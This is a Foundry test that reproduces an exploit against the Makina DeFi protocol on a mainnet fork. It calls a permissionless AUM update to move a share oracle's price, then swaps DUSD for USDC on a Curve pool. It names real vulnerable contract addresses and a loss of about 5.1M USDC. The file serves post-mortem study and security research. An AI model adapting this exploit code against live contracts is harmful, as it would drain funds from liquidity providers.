// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~5.1M USDC (pool loss)
// Attacker : 0x935bfb495e33f74d2e9735df1da66ace442ede48
// Attack Contract : 0x935bfb495e33f74d2e9735df1da66ace442ede48
// Vulnerable Contracts :
//   - Machine: 0x6b006870c83b1cd49e766ac9209f8d68763df721
//   - MachineShareOracle: 0xffcbc7a7eef2796c277095c66067ac749f4ca078
//   - DUSD/USDC Pool: 0x32e616f4f17d43f9a5cd9be0e294727187064cb3
// Attack Tx : https://skylens.certik.com/tx/eth/0x569733b8016ef9418f0b6bde8c14224d9e759e79301499908ecbcd956a0651f5

// Post-mortem : https://x.com/nn0b0dyyy/status/2013472538832314630
// Twitter Alert : https://x.com/TenArmorAlert/status/2013460083078836342, https://x.com/CertiKAlert/status/2013473512116363734

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

interface IMachine {
    function updateTotalAum() external returns (uint256);
}

interface IMachineShareOracle {
    function getSharePrice() external view returns (uint256);
}

interface ICurvePool2Coins {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minDy
    ) external;
}

interface EvmVm {
    function getEvmVersion() external pure returns (string memory evm);
    function setEvmVersion(
        string calldata evm
    ) external;
}

contract MakinaExploitTest is Test {
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DUSD = 0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef;
    address private constant MACHINE = 0x6b006870C83b1Cd49E766Ac9209f8d68763Df721;
    address private constant SHARE_ORACLE = 0xFFCBc7A7eEF2796C277095C66067aC749f4cA078;
    address private constant DUSD_USDC_POOL = 0x32E616F4f17d43f9A5cd9Be0e294727187064cb3;

    function setUp() public {
        EvmVm evm = EvmVm(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));
        evm.setEvmVersion("cancun");
        vm.createSelectFork("mainnet", 24_273_362);
        vm.label(USDC, "USDC");
        vm.label(DUSD, "DUSD");
        vm.label(MACHINE, "MakinaMachine");
        vm.label(SHARE_ORACLE, "MachineShareOracle");
        vm.label(DUSD_USDC_POOL, "DUSD/USDC Curve Pool");
    }

    function testMakinaExploitTest() public {
        IMachineShareOracle oracle = IMachineShareOracle(SHARE_ORACLE);
        IMachine machine = IMachine(MACHINE);

        uint256 priceBefore = oracle.getSharePrice();
        emit log_named_uint("sharePrice before", priceBefore);

        // Permissionless AUM refresh (root cause). Anyone can call this.
        uint256 updatedAum = machine.updateTotalAum();
        emit log_named_uint("updated AUM", updatedAum);

        uint256 priceAfter = oracle.getSharePrice();
        emit log_named_uint("sharePrice after", priceAfter);

        // Simulate the attacker holding DUSD (flashloaned in the real attack).
        uint256 dusdAmount = 9_215_229 ether; // 9.215M DUSD
        deal(DUSD, address(this), dusdAmount);
        IERC20Minimal(DUSD).approve(DUSD_USDC_POOL, type(uint256).max);

        uint256 usdcBefore = IERC20Minimal(USDC).balanceOf(address(this));
        ICurvePool2Coins(DUSD_USDC_POOL).exchange(1, 0, dusdAmount, 0);
        uint256 usdcAfter = IERC20Minimal(USDC).balanceOf(address(this));

        emit log_named_uint("USDC out for DUSD swap", usdcAfter - usdcBefore);

        // In the real exploit, this swap and subsequent LP withdrawal were executed
        // right after a flashloan-driven AUM inflation, draining USDC from the pool.
    }
}
